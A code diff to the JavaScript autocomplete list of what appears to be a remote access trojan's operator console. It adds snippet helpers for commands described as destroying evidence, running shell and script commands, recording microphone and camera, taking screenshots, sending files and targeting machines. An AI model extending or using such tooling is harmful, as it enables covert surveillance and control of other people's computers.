@@ -270,44 +270,62 @@ editor.setOptions({
 });
 var fst = {};
 var wordList = [
- {value: "Excape();", args: true, meta: " Execute Batch script and Escape()"},
- {value: "Escape();", args: true, meta: " Destroy Evidence and Escape"},
- {value: "Marco();", args: false, meta: " Returns Polo if Online"},
- {value: "Close();", args: false, meta: " End Execution"},
- {value: "Update();", args: true, meta: " Updates self"},
- {value: "Hibernate();", args: true, meta: " Hibernate till date"},
- {value: "Revive();", args: true, meta: " End Hibernation  "},
- {value: "Notify();", args: true, meta: " Notifies power schedule"},
- {value: "Rename();", args: true, meta: " Renames RAT"},
- {value: "Flash();", args: true, meta: " Flashes Screen, Visual Indication"},
- {value: "Vbs();", args: true, meta: " Runs .VBS Script"},
- {value: "Bat();", args: true, meta: " Runs .Bat Script"},
- {value: "Shell();", args: true, meta: " Runs Shell Commands"},
- {value: "Speak();", args: true, meta: " Text to Speech"},
- {value: "Play();", args: true, meta: " Play a Remote (mp3) Audio File (URL)"},
- {value: "Mic();", args: true, meta: " Records audio for 'x' ms"},
- {value: "Lock();", args: true, meta: " Select Target"},
- {value: "Class();", args: true, meta: " Select a particular class of PCs"},
- {value: "All();", args: false, meta: " Selects All system"},
- {value: "Info();", args: true, meta: " Shows Info box"},
- {value: "Warn();", args: true, meta: " Shows Warning Box"},
- {value: "Error();", args: true, meta: " Shows Error box"},
- {value: "Msgbox(x,y);", args: true, meta: " Shows Msg Box fo 'y' ms"},
- {value: "Google();", args: true, meta: " Googles selected Text"},
- {value: "Web();", args: true, meta: " Navigates to 'x' url"},
- {value: "Type();", args: true, meta: " Types custom text"},
- {value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
- {value: "Camera();", args: true, meta: " Captures a Photo"},
- {value: "Disk();", args: true, meta: " Retrieves Disk Info"},
- {value: "Tree();", args: true, meta: " Retrieves Disk Info"},
- {value: "Send();", args: true, meta: " Sends a File"},
- {value: "Zip();", args: true, meta: " Zip a folder"},
- {value: "Unzip();", args: true, meta: " Unzips file"},
- {value: "Health();", args: true, meta: " Reports back working conditions"},
- {value: "Log();", args: true, meta: " Logs every Activity"},
- {value: "Delay();", args: true, meta: " Pause Execution temporarily for 'x' ms"},
- {value: "Clone();", args: true, meta: " Initiate Clone Operations"},
- {value: "NClone();", args: false, meta: " Stops Cloning op"},
+ {helper: 'Excape("");', value: "Excape();", args: true, meta: " Execute Batch script and Escape()"},
+ {helper: 'Escape("");', value: "Escape();", args: true, meta: " Destroy Evidence and Escape"},
+ {helper: "Marco();", value: "Marco();", args: false, meta: " Returns Polo if Online"},
+ {helper: "Close();", value: "Close();", args: false, meta: " End Execution"},
+ {helper: 'Update("");', value: "Update();", args: true, meta: " Updates self"},
+ {helper: 'Hibernate("");', value: "Hibernate();", args: true, meta: " Hibernate till date"},
+ {helper: "Revive();", value: "Revive();", args: false, meta: " End Hibernation  "},
+ {helper: 'Notify("");', value: "Notify();", args: true, meta: " Notifies power schedule"},
+ {helper: 'Rename("");', value: "Rename();", args: true, meta: " Renames RAT"},
+ {helper: "Flash();", value: "Flash();", args: false, meta: " Flashes Screen, Visual Indication"},
+ {
+  helper: `Vbs(\`
+X=Msgbox("Message Here..",0+16,"TitleHere..")
+\`);`,
+  value: "Vbs();",
+  args: true,
+  meta: " Runs .VBS Script",
+ },
+ {
+  helper: `Bat(\`
+@echo off
+echo.
+echo I'm Batchman..
+echo.
+pause
+\`);`,
+  value: "Bat();",
+  args: true,
+  meta: " Runs .Bat Script",
+ },
+ {helper: 'Shell("");', value: "Shell();", args: true, meta: " Runs Shell Commands"},
+ {helper: 'Speak("Hello...");', value: "Speak();", args: true, meta: " Text to Speech"},
+ {helper: 'Play("http://...");', value: "Play();", args: true, meta: " Play a Remote (mp3) Audio File (URL)"},
+ {helper: 'Mic("");', value: "Mic();", args: true, meta: " Records audio for 'x' ms"},
+ {helper: 'Lock("");', value: "Lock();", args: true, meta: " Select Target"},
+ {helper: 'Class("");', value: "Class();", args: true, meta: " Select a particular class of PCs"},
+ {helper: "All();", value: "All();", args: false, meta: " Selects All system"},
+ {helper: 'Info("This is an Información..");', value: "This is an Inform();", args: true, meta: " Shows Info box"},
+ {helper: 'Warn("This is an Warning..");', value: "Warn();", args: true, meta: " Shows Warning Box"},
+ {helper: 'Error("This is an Error..");', value: "Error();", args: true, meta: " Shows Error box"},
+ {helper: 'Msgbox("Im Batman..",4500);', value: "Msgbox();", args: true, meta: " Shows Msg Box fo 'y' ms"},
+ {helper: 'Google("Hi, How are you doing?..");', value: "Google();", args: true, meta: " Googles selected Text"},
+ {helper: 'Web("https://www.google.com");', value: "Web();", args: true, meta: " Navigates to 'x' url"},
+ {helper: 'Type("Hello, My name is Casper..");', value: "Type();", args: true, meta: " Types custom text"},
+ {helper: 'Screenshot("");', value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
+ {helper: 'Camera("");', value: "Camera();", args: true, meta: " Captures a Photo"},
+ {helper: "Details();", value: "Disk();", args: false, meta: " Retrieves Disk Info"},
+ {helper: 'Tree("C:\\..");', value: "Tree();", args: true, meta: " Retrieves Disk Info"},
+ {helper: 'Send("");', value: "Send();", args: true, meta: " Sends a File"},
+ {helper: 'Zip("");', value: "Zip();", args: true, meta: " Zip a folder"},
+ {helper: 'Unzip("");', value: "Unzip();", args: true, meta: " Unzips file"},
+ {helper: "Health();", value: "Health();", args: false, meta: " Reports back working conditions"},
+ {helper: 'Log("");', value: "Log();", args: true, meta: " Logs every Activity"},
+ {helper: "Delay(5000);", value: "Delay();", args: true, meta: " Pause Execution temporarily for 'x' ms"},
+ {helper: 'Clone("");', value: "Clone();", args: true, meta: " Initiate Clone Operations"},
+ {helper: "NClone();", value: "NClone();", args: false, meta: " Stops Cloning op"},
 ];
 var staticWordCompleter = {
  getCompletions: function (editor, session, pos, prefix, callback) {
@@ -327,13 +345,13 @@ var staticWordCompleter = {
       score: 1000,
       completer: {
        insertMatch: function (editor, data) {
+        data.value = item.helper;
         if (prefix.length != 0) {
          editor.session.remove({start: fst, end: {row: pos.row, column: fst.column + prefix.length}});
         }
         editor.session.insert(editor.getCursorPosition(), data.value);
         if (item.args) {
-         console.log(item.args);
-         editor.gotoLine(pos.row + 1, fst.column + data.value.length - 2);
+         editor.gotoLine(pos.row + 1, fst.column + data.value.length - 3);
         }
        },
       },
